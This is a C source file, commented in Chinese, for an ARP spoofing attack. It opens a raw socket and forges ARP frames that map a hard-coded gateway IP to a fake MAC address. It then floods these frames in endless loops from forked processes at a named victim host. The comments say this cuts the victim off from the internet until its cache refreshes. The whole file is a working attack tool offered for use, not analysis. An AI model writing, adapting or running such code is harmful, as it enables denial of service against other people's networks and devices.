#include <stdio.h>  
#include <stdlib.h>  
#include <string.h>  
#include <unistd.h>  
#include <errno.h>  
#include <sys/socket.h>  
#include <sys/ioctl.h>  
#include <sys/types.h>  
#include <netinet/in.h>  
#include <netinet/if_ether.h>  
#include <net/if_arp.h>  
#include <netpacket/packet.h>  
#include <net/if.h>  
#include <net/ethernet.h>  
#include <arpa/inet.h>  

#include <pthread.h>

static unsigned char s_ip_frame_data[ETH_DATA_LEN];  
static size_t  s_ip_frame_size = 0;  

int main(int argc,char** argv)  
{  
    struct ether_header *eth = NULL;  
    struct ether_arp *arp = NULL;  
    struct ifreq ifr;  
    struct in_addr daddr;  //目标IP
    struct in_addr saddr;  //源IP
    struct sockaddr_ll sll;  

    int skfd;  
    int n = 0;  
 
    /*测试时,对方在使用无线网卡连接时不奏效,而对方在使用有线连接时才奏效;
      且我方攻击方的linux虚拟机的地址也必须和对方的电脑的在同一网段下才奏效,比如:我方攻击方的linux虚拟机的IP地址是192.168.0.xxx,
      对方的电脑IP地址也是192.168.0.xxx
    */
    // 192.168.0.116   80-fa-5b-36-b7-e2 ---->本地网卡(非无线,为有线连接时)
    // 192.168.0.1     34-96-72-1d-32-6f  ----> 网关的 ip地址 和 MAC地址
    unsigned char dmac[ETH_ALEN] = {0x80,0xFA,0x5B,0x36,0xB7,0xE2}; // 被攻击方的IP地址 对应的 MAC地址 
 
    //对方被攻击后,对方网关的ip地址对应的MAC地址就会被修改为该虚假不存在MAC地址, 那么对方就会访问到该虚假不存在MAC地址,便无法连接到互联网了
    //如果一旦停止攻击后,对方电脑会在几分钟之后刷新了arp列表中缓存了的地址之后就会恢复正常上网
    unsigned char smac[ETH_ALEN] = {0x00,0x11,0x22,0x33,0x44,0x55}; //虚假不存在的网关的MAC地址 

    daddr.s_addr = inet_addr("192.168.0.116");//被攻击方的IP地址
 
    saddr.s_addr = inet_addr("192.168.0.1");//被攻击方所在网关的ip地址 

    memset(s_ip_frame_data, 0x00, sizeof(unsigned char)*ETH_DATA_LEN);  

    /*创建原始套接字*/  
    skfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));  
    if (skfd < 0) {  
        perror("socket");
        return -1;  
    }  

    bzero(&ifr,sizeof(ifr));  
    strcpy(ifr.ifr_ifrn.ifrn_name , "eth1");  
    if (-1 == ioctl(skfd, SIOCGIFINDEX, &ifr)) {  
        perror("ioctl");
        return -1;  
    }  
    printf("ifr_ifindex = %d\n", ifr.ifr_ifru.ifru_ivalue);

    bzero(&sll, sizeof(sll));  
    sll.sll_ifindex  = ifr.ifr_ifru.ifru_ivalue;
    sll.sll_family   = PF_PACKET;
    sll.sll_protocol = htons(ETH_P_ALL);

    /*构造以太报文*/  
    eth = (struct ether_header*)s_ip_frame_data;  
    eth->ether_type = htons(ETHERTYPE_ARP);  
    memcpy(eth->ether_dhost, dmac, ETH_ALEN);   
    memcpy(eth->ether_shost, smac, ETH_ALEN);  

    /*构造ARP报文*/     
    arp = (struct ether_arp*)(s_ip_frame_data + sizeof(struct ether_header));  
    arp->arp_hrd = htons(ARPHRD_ETHER);   
    arp->arp_pro = htons(ETHERTYPE_IP);   
    arp->arp_hln = ETH_ALEN;  
    arp->arp_pln = 4;  
    arp->arp_op  = htons(ARPOP_REQUEST);  

    memcpy(arp->arp_sha, smac, ETH_ALEN);  
    memcpy(arp->arp_spa, &saddr.s_addr, 4);
    /* 
     *     memcpy(arp->arp_tha, dmac, ETH_ALEN);*/  
    memcpy(arp->arp_tpa, &daddr.s_addr, 4);

    //-------------------使用多进程同时发送虚假的网关MAC地址到对方电脑进行arp欺骗---------
    int i;
    for(i = 0; i < 1500; ++i)
    {
        pthread_t pid = fork();//创建多进程
        if(pid == 0)
        {
            s_ip_frame_size = sizeof(struct ether_header) + sizeof(struct ether_arp);  
            while(1)
            {
		//在与对方电脑连接时,发送虚假的网关MAC地址到对方电脑进行arp欺骗
                n = sendto(skfd, s_ip_frame_data, s_ip_frame_size, 0,(struct sockaddr*)&sll, sizeof(sll));  
                if (n < 0) {  
                    perror("sendto");  
                }  
                else {  
                    printf("sendto() n = %d \n", n);  
                }  
            }
        }
        close(skfd);  
        return 0;  
    }
}
